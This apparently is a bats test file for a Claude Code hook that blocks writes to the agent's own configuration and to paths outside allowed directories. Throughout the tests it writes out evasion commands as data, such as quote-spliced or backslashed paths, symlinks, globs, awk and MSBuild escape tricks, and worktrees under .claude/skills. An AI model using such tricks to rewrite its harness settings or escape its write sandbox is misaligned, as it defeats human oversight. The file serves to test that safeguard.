        "gh pr edit 1 --repo o/r --body 'see .claude/settings.json'" \
        "gh pr view 1 --repo o/r --json comments,reviews" \
        "gh pr checks 1 --repo o/r" \
        "gh pr review 1 --repo o/r -c -b 'see .claude/settings.json'" \
        "gh pr ready 1 --repo o/r --undo" \
        "gh pr merge 1 --repo o/r --auto --squash" \
        "gh pr merge 1 --repo o/r --disable-auto" \
        "gh pr merge 1 --repo o/r --squash --subject '-d .claude/x' --body \"\$(cat ${SRC}/body.md)\"" \
        "gh pr close 1 --repo o/r --comment 'see .claude/settings.json'" \
        "gh pr close 1 --repo o/r -c \"\$(cat ${SRC}/body.md)\"" \
        "gh issue create --repo o/r --title x --body 'see .claude/settings.json'" \
        "gh issue comment 1 --repo o/r --body 'see ~/.claude/hooks'" \
        "gh issue edit 1 --repo o/r --add-label bug" \
        "gh issue view 1 --repo o/r" \
        "gh api repos/o/r/pulls/1/comments -X POST -f body='see .claude/settings.json' -F in_reply_to=1" \
        "gh api \"repos/o/r/issues/\$N\"" \
        "gh run view 1 --repo o/r --log-failed" \
        "gh search issues .claude --repo o/r" \
        "gh repo edit o/r --description 'see .claude/settings.json'" \
        "gh project item-edit --id x --field-id y --project-id z --text '.claude/settings.json'" \
        "gh status"; do
        run_hook_in_dir "${cmd}" "${TEST_TMP}/repo"
        [ "${status}" -eq 0 ] || { echo "blocked from repo: ${cmd}: ${output}" >&2; return 1; }
        run_hook_in_dir "${cmd}" "${TEST_TMP}/repo/.claude"
        [ "${status}" -eq 0 ] || { echo "blocked from .claude: ${cmd}: ${output}" >&2; return 1; }
    done
}

@test "a gh writer can materialise a symlink, so a later write to a path that does not exist yet is blocked" {
    # The same as a git clone.
    assert_each 2 'does not exist' \
        "gh repo clone o/r && echo x > r/new.txt" \
        "gh run download 1 -D art && echo x > art/new.txt" \
        "git -C . clone https://github.com/o/r && echo x > r/new.txt"
    assert_each 0 '' "gh pr view 1 && echo x > new.txt"
}

@test "gh pr merge or close deleting the local branch is a writer, allowed from the repo with ordinary arguments" {
    assert_each 0 '' \
        "gh pr merge 1 --repo o/r --squash -d" \
        "gh pr merge 1 --repo o/r --squash --delete-branch --subject fix" \
        "gh pr close 1 --repo o/r -d"
    assert_each_config_write "gh pr merge 1 --repo o/r -d --body 'see .claude/settings.json'"
}

@test "a write target held in a variable is blocked, protected suffix or not" {
    assert_each 2 'could not be verified' \
        "echo x >> \"\$HOME/.claude/settings.local.json\"" \
        "echo x > \"\$TMPDIR/out.txt\"" \
        "tee \"\$OUT\"" \
        "sort -o \"\$OUT\" in.txt"
}

@test "a protected path spelled with quote splices is blocked; a backslash in a write target is blocked" {
    assert_each 2 'writing to Claude Code configuration' \
        'echo x > .cla"ude"/settings.json' \
        "echo x > .cla'ude'/settings.json" \
        'echo x > .cl\aude/settings.json' \
        'sqlite3 db .once\ .cl\aude/settings.json'
    assert_each 2 'brace, tilde or backslash' 'echo x > sub\x'
}

@test "a write target is reported as bash passes it: an unquoted backslash, or one before \$ in double quotes, is removed" {
    assert_each 2 "argument 'subx' was written with" 'echo x > sub\x'
    # shellcheck disable=SC2016  # literal \$ - must reach the hook unexpanded
    assert_each 2 "argument 'sub\$x' was written with" 'echo x > "sub\$x"'
    assert_each 2 "argument 'sub\\ax' was written with" 'echo x > "sub\ax"'
}

@test "a relative Bash path that reaches a protected file once normalised or through a symlink is blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    printf '{}' > "${TEST_TMP}/repo/.claude/settings.json"
    ln -s "${TEST_TMP}/repo/.claude/settings.json" "${TEST_TMP}/repo/innocent.json"
    assert_each_config_write "echo x > innocent.json" "cp x.json sub/../innocent.json" "echo x > .claude/./settings.json"
}

@test "an unquoted glob that matches a protected file is blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude"
    printf '{}' > "${TEST_TMP}/repo/.claude/settings.json"
    run_in_repo "sed -i 's/a/b/' .cl*/sett*"
    assert_blocked_config_write
}

@test "a glob in a dotnet output path, a cp destination or a redirection that matches a protected directory is blocked" {
    mkdir -p "${TEST_TMP}/repo/.claude/hooks"
    : > "${TEST_TMP}/repo/.claude/hooks/x"
    assert_each_config_write \
        'dotnet build -p:OutDir=.cla*de/hooks/' \
        'dotnet build -p:OutDir=.claude/hoo?s/' \
        'dotnet build -p:OutDir=.cl[a]ude/hooks/' \
        'dotnet build -o .cla*de/hooks' \
        'cp x .cla*de/hooks/' \
        'printf x > .cla*de/hooks/x'
}

# Bash passes a glob that matches nothing through as the literal word, so these write a directory
# literally named .cla*de, not .claude. A glob in the protected entry's own name under a literal
# .claude stays blocked whatever exists.
@test "a glob write target that matches nothing is literal and allowed, with or without a .claude directory" {
    local state
    for state in absent present; do
        [ "${state}" = present ] && mkdir -p "${TEST_TMP}/repo/.claude"
        assert_each 0 '' \
            'dotnet build -p:OutDir=.cla*de/hooks/' \
            'dotnet build -p:OutDir=.cl[a]ude/hooks/' \
            'dotnet build -o .cla*de/hooks' \
            'cp x .cla*de/hooks/' \
            'printf x > .cla*de/hooks/x' || { echo ".claude ${state}" >&2; return 1; }
        assert_each_config_write 'dotnet build -p:OutDir=.claude/hoo?s/' || { echo ".claude ${state}" >&2; return 1; }
    done
}

@test "an unquoted brace expansion in a write target is blocked; a quoted brace is literal" {
    assert_each 2 'brace' "echo x > .claude/settings.{json,x}" "touch {a,b}.txt"
    assert_each 0 '' "touch '{a,b}.txt'" "python3 tool.py '{\"a\": 1}'"
}

@test "ordinary writes, reads of config and non-write redirections are allowed" {
    assert_each 0 '' \
        "echo hi > out.txt" \
        "sed -i 's/a/b/' src/file.txt" \
        "cat .claude/settings.json" \
        "grep x < .mcp.json" \
        "ls 2>&1" \
        "cp a.txt b.txt" \
        "git -C . status" \
        "echo hi | tee out.log" \
        "sed -i 's/a/b/' containers/base/development-full/claude-managed-settings.json" \
        'cat <<EOF
.claude/settings.json
EOF'
}

@test "non-ASCII bytes in a command that writes a file are blocked" {
    assert_each 2 'non-ASCII' "echo x > ‘out.txt’"
}

# --- Bash: classification -------------------------------------------------------

@test "a command with no writer/read-only classification is blocked, even with nothing to write" {
    assert_each 2 'has no writer/read-only classification' "install -m 0644 x.json out.json" "popd"
    printf '%s\n' 'ls read-only' 'cat' 'grep    sometimes' 'head read-only extra' > "${HOOK_DIR}/command-allowlist"
    assert_each 2 'has no writer/read-only classification' "cat README.md" "grep x README.md" "head README.md"
    assert_each 0 '' "ls"
}

@test "a missing or classification-free command-allowlist fails closed" {
    printf '%s\n' '# nothing classified' 'cat' > "${HOOK_DIR}/command-allowlist"
    assert_each 2 'classifies no command' "cat README.md"
    rm -f "${HOOK_DIR}/command-allowlist"
    assert_each 2 'could not be read' "cat README.md"
}

@test "exactly set -e is read-only, as reject-obfuscated-commands allows it" {
    assert_each 0 '' "set -e"
    assert_each 2 'has no writer/read-only classification' "set -x"
}

@test "a read-only command's arguments are not checked as write targets" {
    assert_each 0 '' "cat /etc/hosts" "grep -r x /etc" "ls ${TEST_TMP}/outside" "diff /etc/hosts /etc/passwd"
}

@test "a writer's arguments behind a wrapper are checked by the wrapped command's classification" {
    assert_each 2 'outside the allowed directories' "nice touch /etc/x"
}

# --- Bash: allowed roots ----------------------------------------------------------

@test "a write target outside the allowed roots is blocked for every writer and redirection" {
    assert_each 2 'outside the allowed directories' \
        "tee /etc/x" \
        "touch ../outside/x" \
        "sed -i 's/a/b/' /etc/hosts" \
        "echo x > /etc/x" \
        "echo x >> ${TEST_TMP}/outside/log" \
        "curl -sSo /etc/x https://example.com/x" \
        "sort -o/etc/x in.txt" \
        "flake8 --output-file=/etc/x src" \
        "mkdir -p /etc/x" \
        "chmod +x /etc/x" \
        "awk -i inplace 1 /etc/x" \
        "python3 build.py --out ${TEST_TMP}/outside/x" \
        "git -C . checkout main -- ../outside/x" \
        "gh run download 1 -D ${TEST_TMP}/outside"
}

@test "a short-option word's tails stop at its first '/', so a glued absolute path under a root is allowed" {
    assert_each 0 '' \
        "sort -o${TEST_TMP}/repo/out in.txt" \
        "curl -sSo${TEST_TMP}/repo/dir/file.txt https://example.com/x" \
        "curl -sS -d{\"a\":\"b\"} https://example.com/x"
}

@test "a short-option word's tails up to its first '/' are still each checked as a path and as text" {
    assert_each 2 'outside the allowed directories' \
        "curl -o/etc/x https://example.com/x" \
        "curl -s#o/etc/x https://example.com/x" \
        "curl -sS -odir/file.txt https://example.com/x"
    assert_each_config_write \
        "curl -o.claude/settings.json https://example.com/x" \
        "curl -xo.claude/settings.json https://example.com/x" \
        "curl -o${TEST_TMP}/repo/x/../.claude/settings.json https://example.com/x" \
        "curl -osub/x.claude.json https://example.com/x"
}

@test "an '=' in a short-option word's glued value does not hide the text before it" {
    assert_each 2 'outside the allowed directories' \
        "sort -o../outside/a=b f" \
        "curl -o../outside/a=b https://example.com" \
        "mktemp -p../outside/a=b" \
        "sort --output=../outside/a=b f"
    assert_each_config_write \
        "sort -o.claude/hooks/a=b f" \
        "sort -o${HOME}/.claude/agents/x=y.md f" \
        "sort -o${HOME}/.claude/settings.json=x f" \
        "curl -o.claude/hooks/a=b https://example.com"
    assert_each 0 '' \
        "sort -o${TEST_TMP}/repo/a=b f" \
        "sort --output=${TEST_TMP}/repo/a=b f"
}

@test "a dotnet colon-form option is checked as its value and its MSBuild property value, not as short-option tails" {
    assert_each 0 '' \
        "dotnet build -p:OutputPath=bin/Release" \
        "dotnet build -property:OutputPath=bin/Release" \
        "dotnet build -p:Prop=$(printf 'x%.0s' {1..300})" \
        "dotnet build -o:bin/Release"
    assert_each 2 'outside the allowed directories' \
        "dotnet build -p:OutputPath=../outside/x" \
        "dotnet build -o:../outside/a=b" \
        "dotnet build --output:../outside/a=b"
    assert_each_config_write \
        "dotnet build -p:OutputPath=.claude/hooks" \
        "dotnet build -property:OutputPath=${HOME}/.claude/agents" \
        "dotnet build -o:.claude/hooks"
}

@test "every Name=value pair of a dotnet -p/-property list, separated by ';' or ',', is checked" {
    assert_each 2 'outside the allowed directories' \
        "dotnet build \"-p:A=1;OutputPath=../outside/x\"" \
        "dotnet build \"-p:A=1,OutputPath=../outside/x\"" \
        "dotnet build \"-property:A=1;B=2,OutputPath=${TEST_TMP}/outside/x\""
    assert_each_config_write \
        "dotnet build \"-p:A=1;OutputPath=.claude/hooks\"" \
        "dotnet build \"-p:A=1,OutputPath=${HOME}/.claude/agents\""
    assert_each 0 '' \
        "dotnet build \"-p:A=1;OutputPath=bin/Release\"" \
        "dotnet build \"-p:A=1,B=2;;OutputPath=bin/Release;\""
}

@test "a dotnet -p list pair without '=' is checked whole" {
    assert_each 2 'outside the allowed directories' "dotnet build \"-p:A=1;../outside/x\""
    assert_each_config_write "dotnet build \"-p:A=1;.claude/hooks\""
}

@test "empty pairs and empty values in a dotnet -p list are skipped, and the pairs after them still checked" {
    assert_each 0 '' "dotnet build \"-p:;;\"" "dotnet build \"-p:A=;,B=\"" "dotnet build \"-p:A=;;OutputPath=bin/Release\""
    assert_each 2 'outside the allowed directories' "dotnet build \"-p:A=;;,OutputPath=../outside/x\""
    # After two cds a relative path is unknowable, so an empty pair queued as '' would block.
    assert_each 0 '' "cd ${TEST_TMP}/repo; cd ${TEST_TMP}/repo/sub && dotnet \"-o:${TEST_TMP}/repo/x;\""
}

@test "a dotnet colon-form option with no value names no path and is allowed" {
    assert_each 0 '' "dotnet build -p:" "dotnet build -o:" "dotnet build --output:"
}

@test "a dotnet argument with a %XX escape other than %3B or %2C blocks in every form, since MSBuild decodes it" {
    assert_each 2 'contains a %XX escape other than %3B or %2C, which MSBuild decodes' \
        "dotnet build -p:OutputPath=%2Eclaude/hooks/" \
        "dotnet build -p:OutputPath=%2E%63laude/skills/x/" \
        "dotnet build -p:OutputPath=..%2F..%2Foutside/" \
        "dotnet build -p:OutputPath=%2eclaude/hooks/" \
        "dotnet build -o %2Eclaude/hooks" \
        "dotnet build --output %2Eclaude/hooks" \
        "dotnet build -property:OutputPath=%2Eclaude/hooks/" \
        "dotnet build -p OutputPath=%2Eclaude/hooks/" \
        "dotnet msbuild -p:OutputPath=%2Eclaude/hooks/" \
        "dotnet publish -p:PublishDir=%2Eclaude/hooks/" \
        "dotnet build -bl:%2Eclaude/hooks/x.binlog" \
        "dotnet build -flp:logfile=%2Eclaude/hooks/x.log" \
        "dotnet test --results-directory %2Eclaude/hooks" \
        "dotnet %62uild" \
        "dotnet run -- %2Eclaude/hooks" \
        "dotnet build -p:OutputPath=%2Eclaude/hooks/%3B" \
        "dotnet build -p:X=a%2Cb%2F..%2Foutside" \
        "dotnet build -p:OutputPath=%%3B2Eclaude/hooks/"
}

@test "a dotnet %3B or %2C escape, a literal ';' or ',' in one MSBuild value, is allowed in either case" {
    assert_each 0 '' \
        "dotnet build -p:DefineConstants=DEBUG%3BTRACE" \
        "dotnet build -p:DefineConstants=DEBUG%3bTRACE" \
        "dotnet build -p:X=a%2Cb" \
        "dotnet build -p:X=a%2cb"
}

@test "a dotnet -p value with %3B is one value, so the text after it is not a separate property and stays inside the repo" {
    # MSBuild splits the list on the raw ';' before decoding, so this sets A to the literal
    # '1;OutputPath=../outside/x', and OutputPath is never set. The hook checks the raw value as a
    # path ('1%3BOutputPath=..' is a directory name, not '..'), which stays inside the repo too.
    assert_each 0 '' "dotnet build -p:A=1%3BOutputPath=../outside/x"
    assert_each 2 'outside the allowed directories' "dotnet build \"-p:A=1%3B;OutputPath=../outside/x\""
    assert_each_config_write "dotnet build \"-p:A=1%3B;OutputPath=.claude/hooks\""
}

@test "a dotnet response-file argument blocks in every position, since MSBuild reads switches from it" {
    assert_each 2 'names a response file, whose switches this check cannot see' \
        "dotnet build @x.rsp" \
        "dotnet @x.rsp" \
        "dotnet build \"@x.rsp\"" \
        "dotnet build -c Release @${TEST_TMP}/repo/x.rsp" \
        "dotnet run -- @x.rsp"
    assert_each 0 '' "dotnet build -p:Owner=a@b" "mkdir @x"
}

@test "a variable assignment anywhere in a command with a dotnet call blocks, since MSBuild reads the environment as properties" {
    assert_each 2 'MSBuild reads environment variables as properties' \
        "OutputPath=.claude/hooks/ dotnet build" \
        "BaseOutputPath=../outside/ dotnet build" \
        "PublishDir=.claude/skills/x/ dotnet publish" \
        "MSBuildExtensionsPath=../outside dotnet build" \
        "DOTNET_CLI_TELEMETRY_OPTOUT=1 dotnet build" \
        "OutputPath=.claude/hooks/; dotnet build" \
        "OutputPath=.claude/hooks/ && dotnet build" \
        "dotnet build && Configuration=Release" \
        "echo \$(OutputPath=x) && dotnet build"
    assert_each 0 '' "OutputPath=bin echo x" "dotnet build -p:Configuration=Release"
}

@test "an MSBuild slash-form switch is checked as an absolute path, so it never names a write inside the repo" {
    assert_each 2 '' "dotnet build /p:OutputPath=.claude/hooks/" "dotnet build /p:OutputPath=bin"
}

@test "a dotnet argument without a %XX escape, or for another command, is not blocked as one" {
    assert_each 0 '' \
        "dotnet build -p:Configuration=Release" \
        "dotnet test --filter Name~Foo" \
        "dotnet build -p:Prop=100%" \
        "dotnet build -p:Prop=%zz" \
        "dotnet build '-p:Items=%(Identity)'"
    assert_each 0 '' "mkdir x%2Ey"
}

@test "a colon-form word for a command other than dotnet is checked as short-option tails" {
    assert_each 2 'outside the allowed directories' "sort -o:../outside/x f"
    assert_each 0 '' "sort -o:${TEST_TMP}/repo/x f"
}

@test "a short-option word with a very long run before any '/' is blocked with a clear message" {
    local long
    long=$(printf 'x%.0s' {1..2500})
    assert_each 2 'separate the option value from the option' "curl -sS -d${long} https://example.com/x"
    assert_each 0 '' "curl -sS -d$(printf 'x%.0s' {1..250}) https://example.com/x"
}

@test "/dev/null, /dev/stdout and /dev/stderr are always allowed write targets" {
    assert_each 0 '' "ls > /dev/null 2>&1" "echo x 2>/dev/null" "echo x | tee /dev/stderr" "cat x > /dev/stdout"
}

@test "a write target that is relative after an untrackable cd is blocked" {
    assert_each 2 'unknowable' "ls && cd sub && echo x > out.txt"
}

@test "git worktree add, move, remove and repair are checked on every path, quoted action word or not" {
    assert_each_config_write \
        'git -C . worktree "add" .claude/skills/evil main' \
        'git -C . worktree "add" .claude/agents main' \
        'git -C . worktree "add" -b x .claude/skills/evil' \
        'git -C . worktree add -B x .claude/skills/evil main' \
        'git -C . worktree add --orphan .claude/skills/evil' \
        'git -C . worktree add --lock --reason why .claude/skills/evil' \
        'git -C . worktree move wt .claude/skills/evil' \
        'git -C . worktree remove .claude/skills/evil' \
        'git -C . worktree repair .claude/skills/evil'
    assert_each 2 'outside the allowed directories' \
        'git -C . worktree "add" ../outside/wt main' \
        'git -C . worktree move wt ../outside/wt' \
        'git -C . worktree remove ../outside/wt' \
        'git -C sub worktree add ../../outside/wt main'
}

@test "git worktree with an unknown or non-literal action, or repair naming no path, fails closed" {
    assert_each 2 'could not be verified (non-literal argument)' \
        "git -C . worktree \"\$sub\" .claude/skills/evil" \
        "git -C . worktree add \"\$p\" main" \
        "git -C . worktree move wt \"\$p\""
    assert_each 2 'failing closed' 'git -C . worktree' 'git -C . worktree frobnicate .claude/skills/evil'
    assert_each 2 'name each worktree path' 'git -C . worktree repair' 'git -C . worktree repair --relative-paths'
}

@test "git worktree list, prune, lock and unlock, and worktrees added under a root, are allowed" {
    assert_each 0 '' \
        'git -C . worktree list' \
        'git -C . worktree list --porcelain' \
        'git -C . worktree prune' \
        'git -C . worktree prune -n --expire now' \
        'git -C . worktree lock --reason .claude/settings.json wt' \
        'git -C . worktree unlock wt' \
        'git -C . worktree -h' \
        'git -C . worktree add wt main' \
        'git -C . worktree add -b .claude/agents wt main' \
        "git -C . worktree add ../src/wt main" \
        "git -C . worktree add ${SRC}/wt main" \
        "git -C . worktree add ${TMPDIR}/wt main" \
        'git -C . worktree move wt sub/wt' \
        'git -C . worktree remove wt' \
        'git -C . worktree repair wt'
}

@test "git path writers resolve relative to the last -C, not the hook's cwd" {
    mkdir -p "${TEST_TMP}/repo/sub/.claude"
    run_in_repo "git -C sub checkout main -- .claude/settings.json"
    assert_blocked_config_write
    assert_each 0 '' "git -C sub checkout main -- src/x" "git -C sub checkout main -- ../x"
    assert_each 2 'outside the allowed directories' "git -C sub checkout main -- ../../x" \
        "git -C sub checko\\ut main -- ../../x"
}

@test "ln -s may point outside the roots, but the link it creates and any hard link may not" {
    assert_each 0 '' "ln -s ${TEST_TMP}/outside/x link" "ln -sf /etc/hosts sub/hosts"
    assert_each 2 'outside the allowed directories' \
        "ln -s x ${TEST_TMP}/outside/link" \
        "ln -s -t ${TEST_TMP}/outside x" \
        "ln ${TEST_TMP}/outside/x link"
}

@test "ln -s to a target naming protected config is blocked as text, in every option form" {
    assert_each_config_write "ln -s ~/.claude/settings.json foo" "ln -sf .claude/hooks/x foo" \
        "ln -s -t sub .claude/settings.json" "ln --symbolic /etc/claude-code/managed-settings.json foo" \
        "ln -s ../.claude/settings.json foo" "ln -s ${HOME}/.claude foo" "ln -s .claude/settings.json" \
        "ln -s -t sub ${TEST_TMP}/outside/x .claude/skills/y" "ln -s ${TEST_TMP}/outside/x .mcp.json sub"
    assert_each 0 '' "ln -s ${TEST_TMP}/outside/x link" "ln -s sub/x link" "ln -s -t sub ${TEST_TMP}/outside/x ../y" \
        "ln -s ${TEST_TMP}/outside/x"
}

@test "a bare - is an ln operand (a file name), not an option" {
    assert_each_config_write "ln -s .claude/settings.json -" "ln -s ok .claude/settings.json -"
    assert_each 0 '' "ln -s ok -" "ln -s ${TEST_TMP}/outside/x -" "ln -s ok ${TEST_TMP}/outside/x -"
    assert_each 2 'outside the allowed directories' "ln -s - ${TEST_TMP}/outside/link"
}

@test "a bare - is a hard ln operand or target directory (a file name), not stdin/stdout" {
    assert_each_in_dir "${TEST_TMP}/outside" 2 'outside the allowed directories' \
        "ln ${TEST_TMP}/repo/a -" "ln -t - ${TEST_TMP}/repo/a" "ln -s ${TEST_TMP}/repo/a -"
    assert_each 0 '' "ln ${TEST_TMP}/repo/a -" "ln -t - ${TEST_TMP}/repo/a" "ln -s ${TEST_TMP}/repo/a -"
}

@test "ln -s to a target that is not fully literal is blocked, since it could name protected config" {
    assert_each 2 'a symbolic link target must be a literal path' \
        "ln -s \"\$HOME/.claude\" c" "ln -s \"\${HOME}/.claude/settings.json\" foo" \
        "ln -sf \$(echo x) c" "ln -fs \`echo x\` c" "ln --symbolic \"\${X}\" c" "ln -s \$((1)) c" \
        "ln -s -t sub \"\$X\"" "ln -st sub \"\$X\"" "ln -s --target-directory=sub \"\$X\"" \
        "ln -s \$'x' c" "ln -s ${TEST_TMP}/outside/x \"\$X\" sub" "ln -s -- \"\$X\" c"
    assert_each 0 '' "ln -s ${TEST_TMP}/outside/x c" "ln -sf '${TEST_TMP}/outside/x' c" \
        "ln --symbolic \"${TEST_TMP}/outside/x\" c" "ln -s -t sub ${TEST_TMP}/outside/x"
    # A hard link names an existing file, so each operand is a write target as before.
    assert_each 2 'ln argument could not be verified (non-literal argument)' "ln \"\$X\" c" "ln -f \$(echo x) c" "ln -t sub \"\$X\""
}

@test "text naming anything under a claude-code directory is blocked, since a link to /etc reaches it without naming etc" {
    # /usr/lib/ssl/certs stands for any system symlink to a directory under /etc; the check is text only.
    assert_each_config_write \
        "sed -n 'w foo/claude-code/managed-settings.json' ${SRC}/payload" \
        "awk '{print > \"foo/claude-code/hooks/x\"}' ${SRC}/payload" \
        "ln -s /etc foo && sed -n 'w foo/claude-code/managed-settings.json' ${SRC}/payload" \
        "sed -n 'w /usr/lib/ssl/certs/../../claude-code/managed-settings.json' ${SRC}/payload" \
        "sed -n 'w claude-code/CLAUDE.md' ${SRC}/payload" "sed -n 'wclaude-code/x' ${SRC}/payload" \
        "sqlite3 :memory: '.once foo/claude-code/managed-mcp.json' 'select 1;'" \
        "ln -s foo/claude-code/hooks bar"
    run_hook_in_dir "sed -n 'w claude-code/managed-settings.json' ${SRC}/payload" /etc
    assert_blocked_config_write
    assert_each 0 '' "ln -s /etc foo" "ln -sf /etc/hosts sub/hosts" \
        "npm install @anthropic-ai/claude-code" "gh repo clone anthropics/claude-code" \
        "git -C . clone https://github.com/anthropics/claude-code" \
        "sed -n 'w claude-codex/x' ${SRC}/payload" "sed -n 'w x/claude-code.d' ${SRC}/payload"
}

@test "ln -s to a claude-code directory or anywhere inside a .claude tree is blocked, since a later write through it names nothing protected" {
    assert_each_config_write "ln -s foo/claude-code bar" "ln -s claude-code bar" "ln -s ${HOME}/.claude/projects p" \
        "ln -s -t sub .claude/x" "ln -s /etc/claude-code bar"
    assert_each 0 '' "ln -s claude-code.d bar" "ln -s foo/claude-codex bar" "ln -s ${HOME}/.claudex/y bar"
    # A glob target is checked by what each match resolves to, anywhere inside a configuration tree.
    mkdir -p "${HOME}/.claude/projects" "${TEST_TMP}/outside/projects"
    assert_each_config_write "ln -s ${HOME}/.cl?ude/projects p" "ln -s -t sub ${HOME}/.claude/proj*" "ln -s /et?/claude-code bar"
    assert_each 0 '' "ln -s ${TEST_TMP}/outsid?/projects p"
}

@test "ln -s to a target that names protected config only once bash expands it is blocked" {
    mkdir -p "${HOME}/.claude"
    touch "${TEST_TMP}/outside/a"
    assert_each_config_write "ln -s .cl\\aude/settings.json foo" "ln -s ${HOME}/.cla* foo" "ln -s -t sub ${HOME}/.clau?e"
    assert_each 2 'brace expansion' "ln -s ${HOME}/.{claude,x}/settings.json foo" "ln -s -t sub .{claude,x}"
    assert_each 0 '' "ln -s '.cl{aude}' foo" "ln -s 'sub\\x' foo" "ln -s ${TEST_TMP}/outside/* sub" "ln -s sub/nomatch* foo" \
        "ln -s '.cl\\aude/settings.json' foo" "ln -s .cl\\\\aude/settings.json foo"
}

@test "sed and awk program text that names protected config only once bash removes a backslash is blocked" {
    assert_each_config_write "sed -n w.cl\\aude/settings.json f.txt" "sed -n -e w.cl\\aude/settings.json f.txt" \
        "sed -n --expression=w.cl\\aude/settings.json f.txt" "sed -n 'w '.cl\\aude/settings.json f.txt" \
        "awk '{print > f}' f=.cl\\aude/settings.json x" "awk -v f=.cl\\aude/settings.json '{print > f}' x" \
        "awk -e 'print > \"'.cl\\aude/settings.json'\"' x"
}

@test "a backslash bash keeps, or one that spells no protected name once removed, is allowed in sed and awk program text" {
    assert_each 0 '' "sed -n 'w .cl\\aude/settings.json' f.txt" "sed -n \"w .cl\\aude/settings.json\" f.txt" \
        "sed -n \"w .cl\\\\aude/settings.json\" f.txt" "sed -n w.cl\\\\aude/settings.json f.txt" \
        "sed -i 's/\\.claude\\.json/x/' f.txt" "sed -i s/a\\.b/c/ f.txt" \
        "awk -v f=a\\b '{print > f}' x" "awk '{print n}' n=a\\\\b x"
}

# awk decodes escapes in its own string literals and in -v and name=value values (an unknown
# escape is the plain letter, octal is masked to a byte, hex takes two digits (every digit in older
# gawk), a NUL ends the name and a backslash-newline is removed), and sqlite3 does the same in a
# double-quoted dot-command argument, after bash has passed the backslash through.
@test "awk text and sqlite3 arguments that name protected config only once the program decodes its escapes are blocked" {
    assert_each_config_write "awk '{print > \".c\\laude/settings.json\"}' x" \
        "awk '{print > \"\\056claude/settings.json\"}' x" \
        "awk 'BEGIN{print 1 > \"\\456claude/hooks/x\"}'" \
        "awk 'BEGIN{print 1 > \"\\x2eclaude/agents/x\"}'" \
        "awk 'BEGIN{print 1 > \"\\x02emcp.json\"}'" \
        "awk 'BEGIN{print 1 > \".claude\\000x\"}'" \
        "awk 'BEGIN{print 1 > \".claude\\/skills/x\"}'" \
        $'awk \'BEGIN{print 1 > ".cl\\\naude/settings.json"}\'' \
        "awk -v f='.c\\laude/settings.json' '{print > f}' x" \
        "awk -v f='\\056mcp.json' '{print > f}' x" \
        "awk '{print > f}' 'f=\\056claude/settings.json' x" \
        "awk -e 'print > \".c\\laude/settings.json\"' x" \
        "sqlite3 db '.once \".c\\laude/settings.json\"' 'select 1;'" \
        "sqlite3 db '.output \"\\056claude/settings.json\"' 'select 1;'" \
        "sqlite3 db '.once \"\\x2emcp.json\"' 'select 1;'"
}

# gawk 5.3+ and sqlite3 read `\u` and its hex digits as a code point, gawk with no fixed digit
# count, so a `\u` escape cannot be decoded reliably and blocks outright.
@test "a \\u escape in awk text or a writer argument is blocked, and a \\u before a non-hex character is allowed" {
    assert_each 2 'contains a \u escape' "awk '{print > \"\\u002eclaude/settings.json\"}' x" \
        "awk -v f='\\u002emcp.json' '{print > f}' x" "sqlite3 db '.once \"\\u002emcp.json\"' 'select 1;'"
    assert_each 0 '' "awk '{print \"\\users\"}' f.txt" "sqlite3 db '.once \"x\\users\"' 'select 1;'"
}

@test "awk text and sqlite3 arguments whose escapes decode to no protected name are allowed" {
    assert_each 0 '' "awk '{print \$1 \"\\t\" \$2}' f.txt" "awk '{printf \"%s\\n\", \$1}' f.txt" \
        "awk -v OFS='\\t' '{print}' f.txt" "awk '{gsub(/\\./, \"_\"); print}' f.txt" "awk '/\\.txt\$/' f.txt" \
        "awk '{print > \"out\\056txt\"}' f.txt" "awk 'BEGIN{print 1 > \"\\x41claude\"}'" \
        "sqlite3 db '.once \"out\\056csv\"' 'select 1;'" "sqlite3 db '.print \"a\\tb\"'"
}

@test "a hard ln to protected config is blocked" {
    assert_each_config_write "ln ${HOME}/.claude/settings.json foo" "ln .claude/hooks/x foo" "ln -t sub .claude/settings.json"
}

@test "mktemp with no template writes into TMPDIR, which must be under a root" {
    printf '%s\n' "${TEST_TMP}/repo" > "${HOOK_DIR}/allowed-dirs"
    run_in_repo "mktemp -d"
    [ "${status}" -eq 2 ]
    [[ "${output}" == *"implicit \$TMPDIR"* ]]
    printf '%s\n' "${TEST_TMP}/repo" "${TMPDIR}" > "${HOOK_DIR}/allowed-dirs"
    run_in_repo "mktemp -d"
    [ "${status}" -eq 0 ]
    assert_each 0 '' "mktemp ${TEST_TMP}/repo/x.XXXXXX"
}

@test "a sed or awk that does not edit in place may read files outside the roots" {
    assert_each 0 '' "sed -n '/x/p' /etc/hosts" "awk '{print \$1}' /etc/hosts" "sed -e 's/a/b/' -e '/^#/d' /etc/hosts"
}

@test "a write target that does not exist yet is blocked after a call that can create a symlink" {
    assert_each 2 'can create symlinks' "ln -s ${TEST_TMP}/outside link && tee link/x"
    assert_each 0 '' "touch a.txt && tee b.txt"
}

@test "no allowed roots fails closed for a writer but not for a read-only command" {
    rm -f "${HOOK_DIR}/allowed-dirs"
    assert_each 2 'no allowed directories are configured' "touch out.txt" "echo x > out.txt"
    assert_each 0 '' "cat README.md" "echo x > /dev/null"
}

# --- option parsing of the writers with their own rule ----------------------------

@test "a file tool path starting with ~ resolves against HOME" {
    local tilde_path
    printf -v tilde_path '%s/.claude/settings.json' '~'
    run_file_tool Write "${tilde_path}"
    assert_blocked_config_write
    run_file_tool Write '~'
    [ "${status}" -eq 0 ]
}

@test "the >|, &>> and <> redirections are write targets" {
    local op
    for op in '>|' '&>>' '<>'; do
        assert_each 2 'outside the allowed directories' "echo x ${op} ${TEST_TMP}/outside/f"
        assert_each 0 '' "echo x ${op} out.txt"
    done
}

# shfmt before 3.14 (Debian's and Ubuntu's packaged versions) encodes a redirection's Op as an
# integer token whose value shifts between releases, so the stub rewrites every Op to an integer
# and the operator must still be read from the command text.
@test "a redirection is a write target when shfmt encodes its operator as an integer" {
    local real_shfmt real_jq
    real_shfmt=$(command -v shfmt)
    real_jq=$(command -v jq)
    make_stub shfmt "'${real_shfmt}' \"\$@\" | '${real_jq}' -c '(.. | objects | select(has(\"Op\")) | .Op) |= 77'"
    local op
    for op in '>' '>>' '>|' '&>' '&>>' '<>' '>&'; do
        assert_each 2 'outside the allowed directories' "echo x ${op} ${TEST_TMP}/outside/f" "echo x 2${op} ${TEST_TMP}/outside/f"
    done
    assert_each 2 'writing to Claude Code configuration' "echo '{}' > .claude/settings.json"
    assert_each 2 'non-ASCII' "echo x > ‘out.txt’" "echo ‘x’ > out.txt"
